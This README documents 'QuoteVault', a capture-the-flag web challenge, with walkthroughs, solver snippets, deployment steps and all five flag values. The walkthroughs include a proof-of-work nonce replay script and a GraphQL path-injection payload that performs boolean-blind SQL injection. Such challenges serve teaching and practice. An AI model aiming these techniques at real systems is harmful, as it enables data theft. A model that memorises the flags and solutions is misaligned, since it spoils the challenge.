# QuoteVault

**Author:** Tristan Dostaler & Guillaume Caillé

**Category:** Web

## Description

QuoteVault is a small "inspirational quotes" web app — a curated catalog, a
gallery of share-able quote cards, and a card-verification page. It's also a
multi-layered web target: behind a polished frontend live five separate flaws,
each worth its own flag. 
This is a web challenge that will require you to dabble in other CTF categories as well.

The site lives behind a single HTTP port: `http://<host>:8080/`.

### Files

None. Players only get the URL.

### Host

`http://<host>:8080/`

## Part 1

**CTFd name:** QuoteVault — Hidden in plain sight

### CTFd Description

Every quote card looks the same to a human, but PNGs carry more than pixels.
Pick any card from the gallery and look inside.

### Depends on

None.

### Flag

<details>
<summary>(expand to read)</summary><br>

`Cybersci{on-every-card-Q2eR8nFsD}`

</details>

### Walkthrough

<details>
<summary>(expand to read)</summary><br>

The gallery page (`/gallery`) links to the full image index at `/images/`.
Every card is a PNG, and every PNG carries the same flag in a `Flag` tEXt
chunk written by the generator.

To actually fetch a card you first need a valid proof-of-work nonce (see
Part 4's walkthrough). Once you have a card on disk:

```bash
python3 -c "from PIL import Image; print(Image.open('card.png').text)"
```

Output includes `'Flag': 'Cybersci{on-every-card-Q2eR8nFsD}'`.

The point of this flag is for players to *open the image*, not just stare at
it — a one-line introduction to "look at what the file actually contains".

See `solve_files/solve.py::fetch_image_metadata_flag`.

</details>

## Part 2

**CTFd name:** QuoteVault — Ask and you shall receive

### CTFd Description

The frontend calls `/api/quotes` to render its catalog. The API speaks more
than just `quote` and `quotes`.

### Depends on

None.

### Flag

<details>
<summary>(expand to read)</summary><br>

`Cybersci{graphql-discovered-by-introspection-9847}`

</details>

### Walkthrough

<details>
<summary>(expand to read)</summary><br>

DevTools' Network tab on the homepage shows `POST /api/quotes` with a GraphQL
body. Introspection isn't disabled, so `__schema` reveals a `flag: String!`
top-level query field alongside `quote`, `quotes`, `search`, and `findQuote`.

```bash
curl -s http://<host>:8080/api/quotes \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ flag }"}'
```

Response: `{"data":{"flag":"Cybersci{graphql-discovered-by-introspection-9847}"}}`.

See `solve_files/solve.py::fetch_graphql_flag`.

</details>

## Part 3

**CTFd name:** QuoteVault — Compute it yourself

### CTFd Description

Each quote card carries a 16-character identifier you can derive client-side.
The `/verify` page does it locally in your browser. Find how it's done, find the redemption phrase, and you can
build the flag yourself — no server round-trip needed.

### Depends on

None.

### Flag

<details>
<summary>(expand to read)</summary><br>

`Cybersci{hmac-e0a66803d1e633ff}`

</details>

### Walkthrough

<details>
<summary>(expand to read)</summary><br>

`/js/app.js` defines two obfuscated constants near the top of the file:
`_bld` (the HMAC signing key, assembled from `String.fromCharCode(...)` /
`atob(...)` pieces joined by `-`) and `_tk` (a "redemption token" assembled
the same way). The verify page renders a hidden `<p data-flag-token="hmac">`
element that names the format — `Cybersci{hmac-...}` — so players know what they
are building toward.

After decoding:

- `_bld` → `qv-card-signing-2026`
- `_tk`  → `qv-flag-hmac-redemption`

The flag is `"Cybersci{hmac-" + HMAC-SHA256(_bld, _tk).hex()[:16] + "}"`:

```python
import hmac, hashlib
key = b"qv-card-signing-2026"
msg = b"qv-flag-hmac-redemption"
print("Cybersci{hmac-" + hmac.new(key, msg, hashlib.sha256).hexdigest()[:16] + "}")
# Cybersci{hmac-e0a66803d1e633ff}
```

No server round-trip — the flag is entirely derivable from `/js/app.js`.

See `solve_files/solve.py::fetch_js_constants` and `hmac_truncated`.

</details>

## Part 4

**CTFd name:** QuoteVault — Mind the audit trail

### CTFd Description

The `/images/` autoindex is open, but every individual PNG sits behind a
proof-of-work gate. Is there a way to solve the PoW for 5000 images fast enough?

### Depends on

QuoteVault — Hidden in plain sight

### Flag

<details>
<summary>(expand to read)</summary><br>

`Cybersci{pow-replay-bypass-K2pV7m}`

</details>

### Walkthrough

<details>
<summary>(expand to read)</summary><br>

Trying to fetch `/images/img-00001.png` cold returns `403` with a JSON body
explaining the three-step PoW handshake:

1. `GET /pow/challenge?image=img-00001.png` → returns `{challenge, image, bits}`.
2. Find a `nonce` such that `sha256(challenge + image + nonce)` has 18 leading
   zero bits (≈250 k attempts; a few seconds in pure Python, ms in C).
3. `POST /pow/submit` with `{image, nonce}` to register the nonce. From then
   on, `GET /images/<image>?pow=<nonce>` works.

The bug is on the retrieval side: the proxy checks that the submitted nonce
exists in its in-memory table, but does **not** check that the registered
filename matches the requested filename. So a nonce solved for
`img-00001.png` will happily fetch `img-00002.png`.

The catch — and the flag — is the audit header. When the proxy detects the
mismatch, it still serves the image (the bug) but stamps an `X-Audit-Token`
response header on the reply. Read the header, not the body:

```python
import hashlib, requests
base = "http://<host>:8080"

ch = requests.get(f"{base}/pow/challenge?image=img-00001.png").json()
i = 0
while True:
    nonce = format(i, "x")
    d = hashlib.sha256(f"{ch['challenge']}img-00001.png{nonce}".encode()).digest()
    full, rem = divmod(ch["bits"], 8)
    if not any(d[j] for j in range(full)) and not (rem and (d[full] >> (8 - rem))):
        break
    i += 1
requests.post(f"{base}/pow/submit",
              json={"image": "img-00001.png", "nonce": nonce}).raise_for_status()

# Use the nonce against a *different* filename — that's the replay.
r = requests.get(f"{base}/images/img-00002.png", params={"pow": nonce})
print(r.headers["X-Audit-Token"])   # Cybersci{pow-replay-bypass-K2pV7m}
```

A naïve solver that only inspects response bodies will never see this flag.

See `solve_files/solve.py::fetch_pow_replay_flag`.

</details>

## Part 5

**CTFd name:** QuoteVault — Vault of secrets

### CTFd Description

The catalog page hides one valid solution card. Can you find which one?
Then, can you find how this information is used?

### Depends on

QuoteVault — Compute it yourself

### Flag

<details>
<summary>(expand to read)</summary><br>

`Cybersci{vXukCggDCyberScigQKscRDR}`

</details>

### Walkthrough

<details>
<summary>(expand to read)</summary><br>

Three bugs chained:

1. **Outlier card.** Scrape `/images/` for the 5,000 PNG filenames (using
   the replayed PoW nonce from Part 4 — one PoW is enough for the whole set).
   Find the single card whose `Solution` tEXt chunk is `true`.

2. **OCR + HMAC.** The phrase rendered on that card (e.g. `topaz poppy marsh
   mist`) maps to a 16-hex-char folder identifier via
   `HMAC-SHA256(<key>, normalized_phrase)[:16]`, using the *same* key as
   Part 3 (`qv-card-signing-2026`, recovered from `/js/app.js::_bld`).
   The `/verify` page does this client-side and shows how.

3. **GraphQL path injection → boolean-blind SQLi.** `GET /api/quotes/<path>`
   interpolates `<path>` directly into:

   ```graphql
   { quote(id: <PATH>) { id value author } }
   ```

   The schema also has a `findQuote(filter: String!)` field that the POST
   resolver rejects but the path-interpolating GET still happily executes.
   `findQuote.filter` is concatenated into raw SQL:

   ```sql
   SELECT id, value, author FROM quotes WHERE id = {filter}
   ```

   Payload (URL-encoded into the path):

   ```
   /api/quotes/1) { id } findQuote(filter: "1 AND (SELECT unicode(substr(flag,N,1)) FROM secrets WHERE ocr_value='<folder>') < X -- ")
   ```

   The response shows `"findQuote": {...}` when the AND is true,
   `"findQuote": null` when false — a clean boolean oracle. Binary-search
   each character (0x20..0x80) to extract the flag byte by byte.

The reference solver pulls this together in ~9 seconds end-to-end:

```bash
pip install -r solve_files/requirements.txt
# also need: tesseract-ocr (apt-get install tesseract-ocr / brew install tesseract)
python3 solve_files/solve.py --base http://<host>:8080
```

See `solve_files/solve.py` — every flag has its own helper (`fetch_*` /
`extract_master_flag`).

</details>

## Setup instructions

### Prerequisites

- Docker + Docker Compose (or Podman with the compose plugin).
- ~1 GB free RAM (the data dir is a 512 MB tmpfs; the generator holds the
  5,000-PNG set in memory while writing).
- 2+ CPU cores recommended (image rendering is parallelised).

The container is self-contained: nginx, the Flask + Ariadne GraphQL API,
the proof-of-work proxy, and the image/database generator all run under
supervisord inside one image.

### Build & run

```bash
cd server_files
docker compose build      # or: make build
docker compose up -d      # or: make up
docker compose logs -f    # or: make logs   (watch the 50-s rotation)
```

The container exposes `tcp/8080` on the host, mapped to the container's
`:8080`. Adjust `server_files/docker-compose.yml` if you need a different
host port.

### Per-player isolation

The challenge writes to `/data` inside the container, which is a tmpfs in
the compose file. There is no per-request state on disk, but the active
data set is *global* to the container — every concurrent player sees the
same rotating data.

To give each player their own sandbox, run one container per player. Each
container is independent (no shared volumes, no DB outside the tmpfs), so
spinning up N replicas of `server_files/docker-compose.yml` (with distinct
host ports / project names) is enough. CTFd dynamic-instance, kCTF, or any
per-player orchestrator that can launch a docker-compose project works.

### Tunable knobs

`server_files/src/generator/generator.py`:

| Constant | Default | Notes |
|---|---|---|
| `NUM_IMAGES` | 5000 | total cards per cycle |
| `ROTATION_INTERVAL` | 50 (seconds) | bump if 50 feels too tight in playtesting |
| `GRACE_WINDOW` | 5 (seconds) | previous generation stays alive after a swap |
| `WORDS_PER_PHRASE` | 4 | phrase length (must match anything you change in `app.js`) |
| `FOLDER_ID_LEN` | 16 | hex chars taken from HMAC output |
| `HMAC_KEY` | `b"qv-card-signing-2026"` | must match `_bld` in `app.js` |
| `FLAG_REAL` | `Cybersci{vXukCggDCyberScigQKscRDR}` | the master (Part 5) flag |
| `FLAG_IMAGE_META` | `Cybersci{on-every-card-Q2eR8nFsD}` | Part 1 flag |

`server_files/src/pow-server/pow_server.py`:

| Constant | Default | Notes |
|---|---|---|
| `POW_BITS` | 18 | ~3-8 s solve in browser JS, ~120 ms in C |
| `NONCE_TTL` | 60 (seconds) | active nonce lifetime after submit |
| `REPLAY_FLAG` | `Cybersci{pow-replay-bypass-K2pV7m}` | Part 4 flag (emitted in `X-Audit-Token`) |

`server_files/src/api/app.py`:

| Constant | Default | Notes |
|---|---|---|
| `GRAPHQL_FLAG` | `Cybersci{graphql-discovered-by-introspection-9847}` | Part 2 flag |

The PoW signing key (`_bld`) and redemption token (`_tk`) in
`server_files/src/site/js/app.js` are the source of truth for Part 3's
flag — modifying them changes the Part 3 flag value. The `_bld` value must
stay in lock-step with `generator.py::HMAC_KEY` or Part 5's OCR → HMAC →
SQLi chain will not produce the right folder identifier.

### Verifying the deployment

The reference solver in `solve_files/` collects all five flags end-to-end:

```bash
pip install -r solve_files/requirements.txt
# apt-get install tesseract-ocr   (or: brew install tesseract)
python3 solve_files/solve.py --base http://<host>:8080
```

Expected output:

```
hmac         Cybersci{hmac-e0a66803d1e633ff}
graphql      Cybersci{graphql-discovered-by-introspection-9847}
pow_replay   Cybersci{pow-replay-bypass-K2pV7m}
image_meta   Cybersci{on-every-card-Q2eR8nFsD}
master       Cybersci{vXukCggDCyberScigQKscRDR}
```

A full run takes ~9-12 seconds on a modern laptop. If the OCR step fails
(`OCR returned something unexpected`), the rotation just happened mid-run
— retry once.

### Logging

`server_files/docker-compose.yml` sets `OCR_DEBUG=1`, which logs each cycle's
chosen folder identifier + master flag value to container stdout. **Turn this
off for the actual contest** (set `OCR_DEBUG=0` or remove the env var).
